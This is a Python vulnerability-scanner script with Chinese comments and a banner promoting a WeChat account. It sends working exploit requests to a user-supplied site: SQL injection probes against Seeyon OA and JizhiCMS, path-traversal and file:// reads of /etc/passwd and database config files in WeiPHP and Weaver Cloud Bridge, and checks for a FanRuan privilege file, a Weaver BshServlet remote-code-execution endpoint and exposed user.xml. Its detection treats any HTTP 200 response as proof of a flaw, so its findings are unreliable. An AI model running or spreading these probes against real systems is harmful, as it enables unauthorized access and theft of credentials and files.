import requests
import os
def zac():
    print("\033[31m----------------------------------")
    print("\033[31m ZAC漏洞扫描器")
    print("\033[31m公众号：ZAC安全\033[0m")
    print("\033[31m个人微信号: shenfenxinxichaxun99\033[0m")
    print("\033[31murl格式为 www.xxxxxxxx.xxxx\033[0m")
    print("\033[31m----------------------------------\033[0m")

zac()
url=input("请输入你要扫描的网址")

def one():  #帆软v8.0扫描器
    try:url1 = url.replace("www.",'')
    except:
        pass
    try:
        url2 = "http://reports."+url1 + ":8080/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
        url3=requests.get(url2)
        if url3.status_code == 200:
            print('\033[34m存在帆软v8.0漏洞\033[0m')
        else:
            print("不存在帆软v8.0漏洞或需要手动测试")
            print("帆软v5.0", url3.status_code)
    except:
        print("无法获取url")

def two(): #致远OA A6test.jsp sql注入漏洞
    url1 = "http://" + url +"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())"
    url2 = requests.get(url1)
    if url2.status_code==200:
        print("\033[34m存在致远OA A6test.jsp sql注入漏洞\033[0m")
    else:
        print("致远oa",url2.status_code)
def three(): #极致cms v1.71 v1.7 v1.67 sql注入漏洞
    url1="http://"+url+"mypay/alipay_return_pay?out_trade_no=1%27"
    try :url2=requests.get(url1)
    except BaseException:
        print("极致cms 无法获取响应码")
    else:
        if url2.status_code==200:
            print("\033[34m存在极致Cms v1.71 v1.7 v1.67sql注入漏洞\033[0m")
        else:
            print("极致cms", url2.status_code)
def four():#锐捷云课堂主机 目录遍历漏洞
    url1="http://"+url+"/pool"
    url2=requests.get(url1)
    if url2.status_code==200:
        print("\033[34m存在锐捷云课堂主机目录遍历漏洞\033[0m")
    else:
        print("锐捷云课堂", url2.status_code)

def five():#weiphp任意文件读取漏洞
    url1="http://"+url+"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"
    try:url2=requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code==200:
        print("\033[34m存在weiphpv5.0任意文件读取漏洞\033[0m")
    else:
        print("weiphpv5.0",url2.status_code)
def six():#泛微云桥任意文件读取漏洞
    url1="http://"+url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    url1_1="http://"+url+"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    try: url2=requests.get(url1)

    except BaseException:
        print("无法获取响应码")
    try: url3 = requests.get(url1_1)
    except BaseException:
        print("无法获取响应码")

    if url2.status_code==200 or url3.status_code==200:
        print("\033[34m存在泛微云桥任意文件读取漏洞\033[0m")
    else:
        print("泛微云桥",url2.status_code)
def seven():#泛微云桥远程代码执行漏洞
    url1="http://"+url+"/weaver/bsh.servlet.BshServlet/"
    try: url2=requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code==200:
        print("\033[34m存在泛微云桥远程代码执行漏洞\033[0m")
    else:
        print("泛微云桥",url2.status_code)
def eight():#流媒体管理服务器
    url1="http://"+url+"/config/user.xml"
    try:url2=requests.get(url1)
    except BaseException:
        print("无法获取响应码")
    if url2.status_code==200:
        print("\033[34m存在流媒体管理服务器信息泄露\033[0m")
    else:
        print("流媒体管理服务器", url2.status_code)


one()
two()
three()
four()
five()
six()
seven()
eight()
os.system("pause")